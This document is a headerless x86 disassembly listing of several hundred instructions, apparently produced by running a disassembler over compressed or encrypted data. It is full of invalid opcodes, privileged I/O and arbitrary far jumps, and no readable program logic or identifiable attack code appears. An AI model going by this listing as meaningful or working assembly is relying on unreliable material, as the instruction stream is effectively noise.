  4aa368:	pop    edi
  4aa369:	pop    ecx
  4aa36a:	inc    eax
  4aa36b:	and    eax,0x2c03b045
  4aa370:	add    DWORD PTR [eax],esp
  4aa372:	push   eax
  4aa373:	add    eax,DWORD PTR [edx]
  4aa375:	xor    BYTE PTR [ebx+0x39ec4684],dh
  4aa37b:	(bad)  [esi+eax*1-0x3ccf9262]
  4aa382:	cmp    BYTE PTR [edi+0x4b],ch
  4aa385:	js     0x4aa3ed
  4aa387:	popf   
  4aa388:	pop    esp
  4aa389:	sub    edx,DWORD PTR [edx+0x3c8e8b17]
  4aa38f:	dec    edi
  4aa390:	jae    0x4aa3d1
  4aa392:	xor    DWORD PTR [ebx-0x78],edx
  4aa395:	add    al,0x11
  4aa397:	add    DWORD PTR [esi-0x14bff5d7],ebx
  4aa39d:	cmp    dh,dl
  4aa39f:	mov    ch,0xec
  4aa3a1:	push   ebp
  4aa3a2:	push   0xf
  4aa3a4:	push   ebp
  4aa3a5:	mov    dl,0xf8
  4aa3a7:	mov    al,fs:0x6dcf2b3c
  4aa3ad:	dec    eax
  4aa3ae:	xlat   BYTE PTR ds:[ebx]
  4aa3af:	enter  0xbe07,0x70
  4aa3b3:	outs   dx,BYTE PTR ds:[esi]
  4aa3b4:	dec    esp
  4aa3b5:	add    ebp,DWORD PTR [edi+0x2a]
  4aa3b8:	arpl   WORD PTR [edx-0x84fc77b],bx
  4aa3be:	sti    
  4aa3bf:	mov    dl,BYTE PTR [edx+edi*1]
  4aa3c2:	and    ebx,0xf13b1497
  4aa3c8:	mov    eax,ds:0x103fcb03
  4aa3cd:	jbe    0x4aa414
  4aa3cf:	sub    al,0xc7
  4aa3d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aa3d2:	sbb    eax,0xb70fb244
  4aa3d7:	cmp    BYTE PTR [esi+0x1270997],0x45
  4aa3de:	inc    esp
  4aa3df:	cmp    edx,DWORD PTR [ecx]
  4aa3e1:	cmp    BYTE PTR [edx],al
  4aa3e3:	or     BYTE PTR [si+0x3b],0x61
  4aa3e9:	xor    BYTE PTR [eax+0x192b6a10],0x81
  4aa3f0:	loopne 0x4aa466
  4aa3f2:	data16 add al,0xd3
  4aa3f5:	test   BYTE PTR [edx-0x18],ch
  4aa3f8:	sub    al,0x60
  4aa3fa:	sbb    BYTE PTR [edx],al
  4aa3fc:	sub    BYTE PTR [ecx-0x58],ah
  4aa3ff:	xchg   ebx,eax
  4aa400:	sbb    DWORD PTR [ecx+eax*8],esp
  4aa403:	rcl    BYTE PTR [edi],0x45
  4aa406:	pushf  
  4aa407:	inc    esi
  4aa408:	sbb    al,0x84
  4aa40a:	jmp    0x16cea900
  4aa40f:	mov    eax,0xcf6f2a
  4aa414:	add    al,0x34
  4aa416:	mov    dh,0xca
  4aa418:	push   esi
  4aa419:	mov    dh,0x3c
  4aa41b:	xor    BYTE PTR [ebx+0xe],ch
  4aa41e:	or     al,0x4
  4aa420:	inc    edx
  4aa421:	sub    eax,0x7e5d1689
  4aa426:	cs xchg edi,eax
  4aa428:	inc    esp
  4aa429:	dec    esp
  4aa42a:	push   eax
  4aa42b:	mov    BYTE PTR [esi-0x3f649fb8],bl
  4aa431:	xor    ebx,0xb
  4aa434:	fs push ds
  4aa436:	adc    DWORD PTR [eax+0x39c02daa],esp
  4aa43c:	xor    DWORD PTR [ebp-0x36e92d6b],0x50
  4aa443:	mov    esi,0x561ef33b
  4aa448:	pop    es
  4aa449:	add    al,0x29
  4aa44b:	or     BYTE PTR [edx+0x1],dl
  4aa44e:	inc    esi
  4aa44f:	fimul  DWORD PTR [ebx-0x68]
  4aa452:	push   0x74f2396a
  4aa457:	sub    DWORD PTR [edi+0x8],ebp
  4aa45a:	xchg   edi,eax
  4aa45b:	add    BYTE PTR [edi+eiz*8+0x761f6a10],al
  4aa462:	cmp    eax,0xf401bba0
  4aa467:	imul   ebp,DWORD PTR [ebp+0x34],0xb941d834
  4aa46e:	sbb    al,0x1a
  4aa470:	sbb    BYTE PTR [edi+0xb],ch
  4aa473:	cmp    BYTE PTR [eax-0x6f6e894c],cl
  4aa479:	cdq    
  4aa47a:	in     al,0xe1
  4aa47c:	push   0x20512028
  4aa481:	test   DWORD PTR [esp+edi*1],edx
  4aa484:	pop    ebx
  4aa485:	in     eax,0x60
  4aa487:	sbb    al,0x50
  4aa489:	push   0xb503c358
  4aa48e:	clc    
  4aa48f:	or     eax,0x1d047005
  4aa494:	mov    dh,0x75
  4aa496:	mov    dl,0x1e
  4aa498:	js     0x4aa456
  4aa49a:	daa    
  4aa49b:	or     ah,BYTE PTR [esi+0x3c]
  4aa49e:	jne    0x4aa50e
  4aa4a0:	mov    DWORD PTR ds:0x4831f014,edx
  4aa4a6:	or     esi,DWORD PTR ss:[ebx]
  4aa4a9:	rol    DWORD PTR [ebx+edx*1-0x1],0x7
  4aa4ae:	fisubr WORD PTR [ebp-0x3e00c5a8]
  4aa4b4:	loop   0x4aa4bd
  4aa4b6:	xor    eax,edx
  4aa4b8:	and    ebp,DWORD PTR [eax]
  4aa4ba:	xchg   edi,eax
  4aa4bb:	icebp  
  4aa4bc:	inc    eax
  4aa4bd:	mov    esi,?
  4aa4bf:	mov    eax,fs
  4aa4c1:	pop    ebp
  4aa4c2:	aam    0x3b
  4aa4c4:	xor    eax,ecx
  4aa4c6:	jmp    0x45db:0xfcf83312
  4aa4cd:	cld    
  4aa4ce:	sbb    eax,0x5d2da834
  4aa4d3:	or     ch,0x12
  4aa4d6:	mov    esi,0xa3a1bb83
  4aa4db:	or     BYTE PTR [esi],bh
  4aa4dd:	mov    ds:0x7f3724d4,eax
  4aa4e2:	mov    bh,0xc1
  4aa4e4:	shr    eax,0xc8
  4aa4e7:	mov    edx,ecx
  4aa4e9:	retf   0xddbc
  4aa4ec:	std    
  4aa4ed:	int3   
  4aa4ee:	js     0x4aa4a5
  4aa4f0:	loopne 0x4aa501
  4aa4f2:	xor    BYTE PTR [esi],bh
  4aa4f4:	mov    ah,0xc1
  4aa4f6:	shr    eax,1
  4aa4f8:	ret    
  4aa4f9:	sahf   
  4aa4fa:	push   esp
  4aa4fb:	mov    BYTE PTR ds:0xa7421e4b,ah
  4aa501:	lds    eax,FWORD PTR [esi]
  4aa503:	pop    eax
  4aa504:	jle    0x4aa511
  4aa506:	mov    ebx,0xe11c0110
  4aa50b:	push   ebx
  4aa50c:	not    DWORD PTR [esi]
  4aa50e:	and    BYTE PTR [ecx+0x5],bh
  4aa511:	push   es
  4aa512:	xor    DWORD PTR [ebx+0x35],edx
  4aa515:	daa    
  4aa516:	in     al,0x68
  4aa518:	inc    esi
  4aa519:	add    ch,BYTE PTR [ecx]
  4aa51b:	jno    0x4aa56e
  4aa51d:	sub    BYTE PTR [eax+0x53],0x5a
  4aa521:	mov    ds:0x1449100c,eax
  4aa526:	test   BYTE PTR [edx],bl
  4aa528:	add    DWORD PTR [ebx+ecx*4],ebx
  4aa52b:	or     esi,DWORD PTR [edi+0x3e]
  4aa52e:	je     0x4aa559
  4aa530:	popa   
  4aa531:	push   ebx
  4aa532:	shl    DWORD PTR [edx-0x639eb6fd],1
  4aa538:	adc    al,0x4b
  4aa53a:	sbb    edi,edx
  4aa53c:	sbb    ch,BYTE PTR [eax]
  4aa53e:	jne    0x4aa557
  4aa540:	xchg   ebp,eax
  4aa541:	add    bl,BYTE PTR [edi]
  4aa543:	sbb    BYTE PTR [esi],al
  4aa545:	pop    ds
  4aa546:	add    edi,DWORD PTR [edi]
  4aa548:	leave  
  4aa549:	mov    ah,0xd9
  4aa54b:	(bad)  
  4aa54c:	jae    0x4aa551
  4aa54e:	adc    eax,0x19751e5
  4aa553:	or     cl,bl
  4aa555:	aaa    
  4aa556:	and    BYTE PTR [ecx],bh
  4aa558:	adc    BYTE PTR [eax],al
  4aa55a:	add    DWORD PTR [edx],edx
  4aa55c:	icebp  
  4aa55d:	js     0x4aa5a1
  4aa55f:	mov    ch,0x34
  4aa561:	push   0xba80aaf5
  4aa566:	xchg   esp,eax
  4aa567:	lock pop esi
  4aa569:	out    0x53,eax
  4aa56b:	cmp    bl,0x80
  4aa56e:	rol    BYTE PTR [eax+edx*1+0x4f5a20d],1
  4aa575:	xchg   ecx,eax
  4aa576:	addr16 push cs
  4aa578:	mov    ds:0xfcb1039c,al
  4aa57d:	aas    
  4aa57e:	aas    
  4aa57f:	test   BYTE PTR [eax-0xfdf919f],al
  4aa585:	(bad)  
  4aa586:	(bad)  
  4aa587:	mov    eax,ds:0x75e4341e
  4aa58c:	retf   0x7911
  4aa58f:	sub    bl,al
  4aa591:	xor    al,0xc2
  4aa593:	xchg   BYTE PTR [esi+0x2f6b7e8a],bh
  4aa599:	add    DWORD PTR [ecx],ebx
  4aa59b:	dec    ebp
  4aa59c:	out    dx,al
  4aa59d:	ins    BYTE PTR es:[edi],dx
  4aa59e:	cmp    DWORD PTR [eax+0x624cea14],esp
  4aa5a4:	jae    0x4aa604
  4aa5a6:	(bad)  
  4aa5a8:	lods   al,BYTE PTR ds:[esi]
  4aa5a9:	mov    ah,0x50
  4aa5ab:	loope  0x4aa53f
  4aa5ad:	and    al,BYTE PTR [eax+ecx*1-0x2b8d596e]
  4aa5b4:	xchg   edi,eax
  4aa5b5:	push   eax
  4aa5b6:	or     cl,BYTE PTR [edx]
  4aa5b8:	mov    al,ds:0x5018dc14
  4aa5bd:	dec    esp
  4aa5be:	push   esp
  4aa5bf:	hlt    
  4aa5c0:	and    DWORD PTR [edx+0x520c155e],0x5f
  4aa5c7:	push   edi
  4aa5c8:	jmp    0xccb7:0xc5163842
  4aa5cf:	lea    ecx,ds:0xd77eb10f
  4aa5d5:	ss jnp 0x4aa631
  4aa5d8:	add    eax,DWORD PTR [ebx]
  4aa5da:	mov    esp,0x2c45523b
  4aa5df:	add    esi,ebp
  4aa5e1:	add    eax,0x1804b865
  4aa5e6:	push   ebx
  4aa5e7:	push   esi
  4aa5e8:	xor    BYTE PTR [eax+eiz*1-0x2895d3f8],0x20
  4aa5f0:	push   ecx
  4aa5f1:	retf   0x9104
  4aa5f4:	test   DWORD PTR [esi],eax
  4aa5f6:	xchg   DWORD PTR [ebx+0x3885a353],ebx
  4aa5fc:	pop    ebx
  4aa5fd:	push   0x202127f6
  4aa602:	mov    ah,0x0
  4aa604:	ja     0x4aa665
  4aa606:	mov    eax,0xcaa48519
  4aa60b:	retf   0xaa43
  4aa60e:	or     ah,BYTE PTR [ebp+eax*4-0x53c57b48]
  4aa615:	imul   eax,DWORD PTR [ebp+edi*2-0x55],0x14
  4aa61a:	xchg   esp,eax
  4aa61b:	pop    ecx
  4aa61c:	ret    0xcc77
  4aa61f:	(bad)  [esp+ebx*4]
  4aa622:	dec    ebx
  4aa623:	sbb    ebp,0x27
  4aa626:	and    BYTE PTR [ebp+0x1975933d],dl
  4aa62c:	mov    WORD PTR [esi-0x1dfd0fb8],ss
  4aa632:	adc    dl,BYTE PTR [edi+0x32]
  4aa635:	(bad)  ds:0xd8b02bdb
  4aa63b:	push   edi
  4aa63c:	stos   DWORD PTR es:[edi],eax
  4aa63d:	mov    bl,0x1
  4aa63f:	and    esi,ebp
  4aa641:	pusha  
  4aa642:	pop    es
  4aa643:	mov    al,0xe0
  4aa645:	cmp    DWORD PTR [edi+0x30],0x56
  4aa649:	ja     0x4aa67b
  4aa64b:	hlt    
  4aa64c:	inc    edi
  4aa64d:	xor    al,0xb7
  4aa64f:	and    al,0x38
  4aa651:	sub    esp,ebx
  4aa653:	(bad)  
  4aa654:	loopne 0x4aa6ae
  4aa656:	shl    DWORD PTR ds:0xc7d674a3,cl
  4aa65c:	loope  0x4aa66c
  4aa65e:	loope  0x4aa604
  4aa660:	xchg   ebp,eax
  4aa661:	div    BYTE PTR [edi+0x51]
  4aa664:	sbb    bh,BYTE PTR [esi+edx*1]
  4aa667:	push   0x29094274
  4aa66c:	add    DWORD PTR [ebp-0x2d],ecx
  4aa66f:	and    eax,0x4517b766
  4aa674:	adc    DWORD PTR [edi-0x1d],0x5b
  4aa678:	iret   
  4aa679:	test   DWORD PTR [esi],eax
  4aa67b:	push   ebx
  4aa67c:	popa   
  4aa67d:	cmc    
  4aa67e:	xor    BYTE PTR [esi-0x5a],cl
  4aa681:	xchg   esi,eax
  4aa682:	repnz daa 
  4aa684:	lods   eax,DWORD PTR ds:[esi]
  4aa685:	add    bl,cl
  4aa687:	mov    ch,0x44
  4aa689:	inc    eax
  4aa68a:	add    al,0xe1
  4aa68c:	xchg   edx,eax
  4aa68d:	sti    
  4aa68e:	mov    ah,0xb
  4aa690:	push   ecx
  4aa691:	cmp    dh,BYTE PTR [ecx+0x2d]
  4aa694:	and    BYTE PTR [edi-0x5a],dl
  4aa697:	xchg   esi,eax
  4aa698:	shr    BYTE PTR [ebx],1
  4aa69a:	movaps xmm5,XMMWORD PTR [ebx]
  4aa69d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aa69e:	in     al,0x8a
  4aa6a0:	fdivr  st,st(6)
  4aa6a2:	xchg   esp,eax
  4aa6a3:	lock or esp,DWORD PTR [eax]
  4aa6a6:	in     eax,dx
  4aa6a7:	sbb    BYTE PTR [edi-0x31],dh
  4aa6aa:	lea    esi,[edi+0x44]
  4aa6ad:	out    dx,eax
  4aa6ae:	scas   al,BYTE PTR es:[edi]
  4aa6af:	hlt    
  4aa6b0:	push   ecx
  4aa6b1:	pop    ss
  4aa6b2:	jmp    0xbbeb2540
  4aa6b7:	pop    ebx
  4aa6b8:	ret    0x5620
  4aa6bb:	inc    ebx
  4aa6bc:	pop    ss
  4aa6bd:	pop    eax
  4aa6be:	add    BYTE PTR [ebx],0x2e
  4aa6c1:	xor    dl,bh
  4aa6c3:	or     bl,ch
  4aa6c5:	inc    eax
  4aa6c6:	xchg   BYTE PTR [ebp-0x13],al
  4aa6c9:	lods   eax,DWORD PTR cs:[esi]
  4aa6cb:	sbb    eax,0x24ae32eb
  4aa6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aa6d1:	dec    esi
  4aa6d2:	inc    esi
  4aa6d3:	sub    bl,BYTE PTR [esp+eax*2]
  4aa6d6:	inc    ebx
  4aa6d7:	push   es
  4aa6d8:	imul   ebx,DWORD PTR [eax+edx*1+0x79a05c24],0xa58f119f
  4aa6e3:	sub    eax,0x48010354
  4aa6e8:	add    DWORD PTR [esi+0x16f7fd60],ebx
  4aa6ee:	rcr    edx,cl
  4aa6f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aa6f1:	jae    0x4aa68e
  4aa6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4aa6f4:	shl    BYTE PTR [ebx],cl
  4aa6f6:	fisub  WORD PTR [ecx+0x5a]
  4aa6f9:	lock sub eax,DWORD PTR [edi-0xfc859ad]
  4aa700:	pop    esi
  4aa701:	scas   eax,DWORD PTR es:[edi]
  4aa702:	cmp    DWORD PTR [eax],ebx
  4aa704:	rcr    BYTE PTR [ebx],cl
  4aa706:	sub    esp,DWORD PTR [eax]
  4aa708:	pop    ds
  4aa709:	retf   
  4aa70a:	sub    DWORD PTR [edx],ecx
  4aa70c:	iret   
  4aa70d:	sahf   
  4aa70e:	adc    BYTE PTR ds:0xd69a9f50,0x19
  4aa715:	jo     0x4aa756
  4aa717:	or     al,0x5f
  4aa719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4aa71a:	dec    eax
  4aa71b:	and    al,0x29
  4aa71d:	aaa    
  4aa71e:	int    0xec
  4aa720:	pop    esp
  4aa721:	pusha  
  4aa722:	pop    ebp
  4aa723:	dec    ebp
  4aa724:	jne    0x4aa774
  4aa726:	adc    BYTE PTR [ecx+0x2],dl
  4aa729:	or     ecx,ebx
  4aa72b:	and    eax,0x77b81324
  4aa730:	or     al,0x2f
  4aa732:	and    eax,0x5f8d6133
  4aa737:	adc    BYTE PTR ds:0x2e69040c,ah
  4aa73d:	sbb    bh,ch
  4aa73f:	cwde   
  4aa740:	test   BYTE PTR [ebx-0x66ae9291],al
  4aa746:	and    BYTE PTR [eax],dh
  4aa748:	mov    dh,0x37
  4aa74a:	popa   
  4aa74b:	sub    eax,0x291fc301
  4aa750:	js     0x4aa71f
  4aa752:	or     DWORD PTR [esi+0x1da8ab1d],ecx
  4aa758:	ret    
  4aa759:	adc    bl,dl
  4aa75b:	ret    0x5e0f
  4aa75e:	mov    esi,DWORD PTR [esi+0x24]
  4aa761:	ja     0x4aa6f0
  4aa763:	push   ebp
  4aa764:	xor    eax,0x15e18f4
  4aa769:	add    BYTE PTR [edx],al
  4aa76b:	or     al,0x60
  4aa76d:	mov    ebx,0xad016a74
  4aa772:	adc    edx,eax
  4aa774:	jp     0x4aa7a1
  4aa776:	pop    edx
  4aa777:	clc    
  4aa778:	add    al,0x62
  4aa77a:	les    esi,FWORD PTR [edi]
  4aa77c:	sub    esi,edx
  4aa77e:	jmp    0xd46:0x7ef37c29
  4aa785:	add    ecx,ebp
  4aa787:	dec    ecx
  4aa788:	pop    esp
  4aa789:	dec    esi
  4aa78a:	inc    DWORD PTR [esi-0x5e]
  4aa78d:	test   DWORD PTR [ecx],esp
  4aa78f:	popa   
  4aa790:	bound  edx,QWORD PTR [eax-0x6e]
  4aa793:	sbb    BYTE PTR [esp+eiz*4],0x39
  4aa797:	ficom  WORD PTR [ecx+eax*4]
  4aa79a:	push   ecx
  4aa79b:	mov    eax,eax
  4aa79d:	jmp    0x58aececf
  4aa7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4aa7a3:	inc    eax
  4aa7a4:	leave  
  4aa7a5:	adc    ecx,DWORD PTR [edx+0x3a]
  4aa7a8:	sub    al,0x3c
  4aa7aa:	fadd   DWORD PTR [edx+0x10]
  4aa7ad:	dec    ebp
  4aa7ae:	leave  
  4aa7af:	jo     0x4aa7dc
  4aa7b1:	add    eax,DWORD PTR [edi+0xf7c0cd1]
  4aa7b7:	xchg   DWORD PTR [eax-0x2f],esp
  4aa7ba:	sub    BYTE PTR [ebp-0x2e],ah
  4aa7bd:	adc    DWORD PTR [ebx],edx
  4aa7bf:	push   ebx
  4aa7c0:	loopne 0x4aa746
  4aa7c2:	mul    DWORD PTR [eax]
  4aa7c4:	mov    bl,0x61
  4aa7c6:	jno    0x4aa844
  4aa7c8:	mov    dl,0x80
  4aa7ca:	rcl    ch,0xd3
  4aa7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aa7ce:	add    DWORD PTR [edx],0xffffff9c
  4aa7d1:	sub    eax,0x6959094b
  4aa7d6:	sbb    DWORD PTR [ebx+0x2a],0xffffff8f
  4aa7da:	in     al,dx
  4aa7db:	pop    edi
  4aa7dc:	pop    ss
  4aa7dd:	mov    ch,0xc1
  4aa7df:	les    eax,FWORD PTR [ebp+0x176ac581]
  4aa7e5:	sti    
  4aa7e6:	xor    DWORD PTR [edx+edi*1],0x684d747d
  4aa7ed:	clc    
  4aa7ee:	and    edi,DWORD PTR [ebx]
  4aa7f0:	mov    edx,0x68e42790
  4aa7f5:	or     BYTE PTR [esi+0x17],bh
  4aa7f8:	push   0x40c0514
  4aa7fd:	leave  
  4aa7fe:	nop
  4aa7ff:	add    eax,0xd4810119
  4aa804:	adc    al,0x3b
  4aa806:	hlt    
  4aa807:	add    BYTE PTR es:[ebp+0x5e452330],0xcf
  4aa80f:	adc    al,0x5c
  4aa811:	test   dl,bl
  4aa813:	and    eax,0x7c848c92
  4aa818:	icebp  
  4aa819:	fcom   QWORD PTR [ebx+0x74]
  4aa81c:	dec    esi
  4aa81d:	clc    
  4aa81e:	jg     0x4aa7eb
  4aa820:	cmp    al,ch
  4aa822:	test   eax,0x87ed3404
  4aa827:	mov    BYTE PTR [eax+0x43a7448],ah
  4aa82d:	pop    ds
  4aa82e:	add    al,0x10
  4aa830:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4aa832:	mov    eax,ds:0xe8030f9a
  4aa837:	dec    edx
  4aa838:	mov    cs,ecx
  4aa83a:	das    
  4aa83b:	lds    esp,FWORD PTR [edi+edx*1]
  4aa83e:	enter  0x2f31,0x10
  4aa842:	add    al,0x5c
  4aa844:	and    BYTE PTR [edi+0x2d],dl
  4aa847:	(bad)  
  4aa848:	and    BYTE PTR [eax],cl
  4aa84a:	add    dl,BYTE PTR [esi+0x72]
  4aa84d:	add    DWORD PTR [edx],0x18d70b4b
  4aa853:	imul   DWORD PTR [edx+esi*1]
  4aa856:	lods   eax,DWORD PTR ds:[esi]
  4aa857:	pop    edx
  4aa858:	lock mov al,ds:0x28f803a1
  4aa85e:	loope  0x4aa8d1
  4aa860:	mov    cl,0x29
  4aa862:	xchg   esp,eax
  4aa863:	std    
  4aa864:	add    al,0x49
  4aa866:	jecxz  0x4aa86b
  4aa868:	or     dh,BYTE PTR [ebp-0x47eac725]
  4aa86e:	mov    ah,0x50
  4aa870:	xor    BYTE PTR [edi],dl
  4aa872:	rcl    DWORD PTR [edx+0x64890bf4],1
  4aa878:	sub    al,0x7b
  4aa87a:	push   ecx
  4aa87b:	push   cs
  4aa87c:	inc    esp
  4aa87d:	dec    edx
  4aa87e:	iret   
  4aa87f:	rol    DWORD PTR [esp+ebx*8-0x13],cl
  4aa883:	inc    eax
  4aa884:	inc    ebp
  4aa885:	inc    ebp
  4aa886:	(bad)  
  4aa887:	push   ds
  4aa888:	jle    0x4aa89d
  4aa88a:	inc    ebp
  4aa88b:	popf   
  4aa88c:	cmp    DWORD PTR [edi+esi*1+0x34b014b8],eax
  4aa893:	in     eax,dx
  4aa894:	mov    cl,0xa5
  4aa896:	cwde   
  4aa897:	pop    ebp
  4aa898:	in     al,dx
  4aa899:	add    al,0xf6
  4aa89b:	cli    
  4aa89c:	jb     0x4aa8e0
  4aa89e:	push   edx
  4aa89f:	shl    edx,cl
  4aa8a1:	loopne 0x4aa84e
  4aa8a3:	add    al,0xcb
  4aa8a5:	(bad)  gs:[ebp+eax*2-0x10]
  4aa8aa:	test   al,0x7c
  4aa8ac:	and    al,0x94
  4aa8ae:	inc    ebx
  4aa8af:	leave  
  4aa8b0:	sbb    BYTE PTR [edi],0x63
  4aa8b3:	dec    esp
  4aa8b4:	push   ebx
  4aa8b5:	mov    bl,BYTE PTR [ebp+0x10]
  4aa8b8:	dec    edx
  4aa8b9:	enter  0x9fb,0x48
  4aa8bd:	add    eax,0x23678ca7
  4aa8c2:	xor    al,BYTE PTR [eax+0x21496f03]
  4aa8c8:	pop    ebx
  4aa8c9:	jo     0x4aa84b
  4aa8cb:	cmp    esi,esp
  4aa8cd:	pop    edi
  4aa8ce:	xor    esi,DWORD PTR [edi+0x2]
  4aa8d1:	xchg   esp,eax
  4aa8d2:	push   edi
  4aa8d3:	ins    BYTE PTR es:[edi],dx
  4aa8d4:	addr16 adc al,0x8d
  4aa8d7:	dec    edi
  4aa8d8:	fnstenv [eax-0x17cf8ec0]
  4aa8de:	and    ebx,esi
  4aa8e0:	imul   ebp,DWORD PTR ss:[ebx+0x78],0x175a095b
  4aa8e8:	and    eax,0xbb7044b6
  4aa8ed:	or     edi,DWORD PTR [ebp+esi*2+0x3aff322d]
  4aa8f4:	and    eax,0x1a3c13c9
  4aa8f9:	inc    esi
  4aa8fa:	out    0x91,al
  4aa8fc:	je     0x4aa8d1
  4aa8fe:	inc    ecx
  4aa8ff:	push   0xc2d136d8
  4aa904:	cwde   
  4aa905:	jl     0x4aa96c
  4aa907:	not    edi
  4aa909:	mov    eax,ds:0x856d7b21
  4aa90e:	js     0x4aa962
  4aa910:	jnp    0x4aa8dc
  4aa912:	sub    al,0x87
  4aa914:	sub    al,0x5b
  4aa916:	or     al,0x99
  4aa918:	push   edi
  4aa919:	stos   DWORD PTR es:[edi],eax
  4aa91a:	mov    WORD PTR [eax+0x631304e4],gs
  4aa920:	sbb    BYTE PTR [eax+0x1d],ah
  4aa923:	call   0x1a52:0xb5b9e801
  4aa92a:	pop    esp
  4aa92b:	sub    cl,BYTE PTR [ebp-0x2d]
  4aa92e:	test   al,0x45
  4aa930:	inc    ebp
  4aa931:	inc    ebp
  4aa932:	add    cl,BYTE PTR [ebp+0x76]
  4aa935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4aa936:	test   al,0x95
  4aa938:	int    0xb4
  4aa93a:	adc    BYTE PTR [eax+0x7b857183],dh
  4aa940:	dec    ebp
  4aa941:	dec    ebx
  4aa942:	test   BYTE PTR [esi+ebx*8],ah
  4aa945:	mov    ch,0x31
  4aa947:	in     al,dx
  4aa948:	retf   
  4aa949:	xor    bl,bl
  4aa94b:	mov    ebx,0x1daa4820
  4aa950:	sbb    DWORD PTR [ebx+0x41],eax
  4aa953:	fcom   DWORD PTR [edi]
  4aa955:	push   0x3e
  4aa957:	add    dl,0xc3
  4aa95a:	out    0x7,al
  4aa95c:	call   0x60b0:0x9d050440
  4aa963:	mov    edx,0xc1d4c71b
  4aa968:	mov    dh,0xc0
  4aa96a:	or     al,0x5c
  4aa96c:	xchg   ebx,eax
  4aa96d:	leave  
  4aa96e:	xor    DWORD PTR [ebx],0x17
  4aa971:	push   edx
  4aa972:	scas   eax,DWORD PTR es:[edi]
  4aa973:	or     BYTE PTR [ebx-0x2106f285],al
  4aa979:	pop    ebx
  4aa97a:	push   eax
  4aa97b:	xchg   esp,eax
  4aa97c:	daa    
  4aa97d:	push   ecx
  4aa97e:	push   edx
  4aa97f:	cmp    bh,bl
  4aa981:	cmp    DWORD PTR [edx-0x43f34f2c],esi
  4aa987:	push   cs
  4aa988:	retf   0xab0
  4aa98b:	test   al,0xcc
  4aa98d:	pop    ecx
  4aa98e:	mov    bl,al
  4aa990:	mov    edi,edi
  4aa992:	inc    ecx
  4aa993:	in     eax,0x7b
  4aa995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4aa996:	scas   eax,DWORD PTR es:[edi]
  4aa997:	cmp    BYTE PTR [eax+0x8],bl
  4aa99a:	test   BYTE PTR [edi],ch
  4aa99c:	aam    0xf6
  4aa99e:	in     al,dx
  4aa99f:	(bad)  
  4aa9a0:	add    al,bl
  4aa9a2:	and    esi,eax
  4aa9a4:	pop    eax
  4aa9a5:	push   cs
  4aa9a6:	add    DWORD PTR [eax+edx*4-0x77],esi
  4aa9aa:	faddp  st(3),st
  4aa9ac:	arpl   WORD PTR [ecx-0x14],sp
  4aa9af:	sbb    dh,BYTE PTR cs:[edi+0xd]
  4aa9b3:	dec    esi
  4aa9b4:	jl     0x4aa9dc
  4aa9b6:	in     al,0xf2
  4aa9b8:	popf   
  4aa9b9:	idiv   BYTE PTR [ebp+0x20]
  4aa9bc:	test   BYTE PTR [ebp+ebp*2-0x2ddbe5f0],0x28
  4aa9c4:	add    dh,BYTE PTR [edx+0x72]
  4aa9c7:	loopne 0x4aa9f9
  4aa9c9:	dec    esp
  4aa9ca:	lea    eax,[edx]
  4aa9cc:	mov    eax,0x372848c4
  4aa9d1:	ja     0x4aa967
  4aa9d3:	leave  
  4aa9d4:	call   0x5ccad0dc
  4aa9d9:	ror    DWORD PTR [ebx-0x7ce3fce7],0x63
  4aa9e0:	inc    ecx
  4aa9e1:	and    al,0xb2
  4aa9e3:	adc    edx,DWORD PTR [eax-0x6b7522ee]
  4aa9e9:	or     BYTE PTR ds:0x2ce097ce,cl
  4aa9ef:	scas   eax,DWORD PTR es:[edi]
  4aa9f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4aa9f1:	inc    eax
  4aa9f2:	add    bh,bl
  4aa9f4:	mul    BYTE PTR [ebx-0x63]
  4aa9f7:	cmc    
  4aa9f8:	xor    al,0x1c
  4aa9fa:	sub    esi,ecx
  4aa9fc:	jle    0x4aa9f7
  4aa9fe:	cmp    BYTE PTR [ebx+ebp*2+0x11],al
  4aaa02:	fsubr  DWORD PTR [edi+0x74]
  4aaa05:	ja     0x4aa9c8
  4aaa07:	sbb    edi,DWORD PTR [eax+0x228a03c]
  4aaa0d:	loopne 0x4aa9d4
  4aaa0f:	xor    dh,BYTE PTR [ecx-0x30]
  4aaa12:	imul   edx,DWORD PTR [esi],0x3c0f803e
  4aaa18:	jg     0x4aaa48
  4aaa1a:	es repnz arpl ax,bp
  4aaa1e:	jmp    0x4aaa53
  4aaa20:	push   0x0
  4aaa22:	sub    al,0x43
  4aaa24:	cmp    eax,0xd723a112
  4aaa29:	sbb    bl,BYTE PTR [esi+0x49]
  4aaa2c:	in     eax,0x79
  4aaa2e:	inc    edx
  4aaa2f:	sbb    al,ah
  4aaa31:	adc    DWORD PTR [ebp+0x27],esi
  4aaa34:	ds dec esp
  4aaa36:	sbb    al,0x20
  4aaa38:	add    eax,0x228d8c3
  4aaa3d:	xchg   ebx,edi
  4aaa3f:	gs inc ecx
  4aaa41:	mov    bh,0x90
  4aaa43:	fnstenv [ebx+0x863e801]
  4aaa49:	sbb    al,BYTE PTR [edi]
  4aaa4b:	or     BYTE PTR [ecx-0x6fde8f6f],dh
  4aaa51:	ficom  DWORD PTR [eax]
  4aaa53:	hlt    
  4aaa54:	push   cs
  4aaa55:	mov    esi,0x6dacd80a
  4aaa5a:	scas   al,BYTE PTR es:[edi]
  4aaa5b:	sbb    dl,BYTE PTR [ecx+0x1871f49f]
  4aaa61:	or     ch,BYTE PTR [ecx-0x2240cd78]
  4aaa67:	mov    cs,WORD PTR [ebx+0xf2af417]
  4aaa6d:	lahf   
  4aaa6e:	sbb    dl,dh
  4aaa70:	je     0x4aaaa2
  4aaa72:	xor    BYTE PTR [edi],ch
  4aaa74:	adc    ah,BYTE PTR [esi]
  4aaa76:	sbb    BYTE PTR [ebx],ch
  4aaa78:	inc    edi
  4aaa79:	sahf   
  4aaa7a:	pop    esp
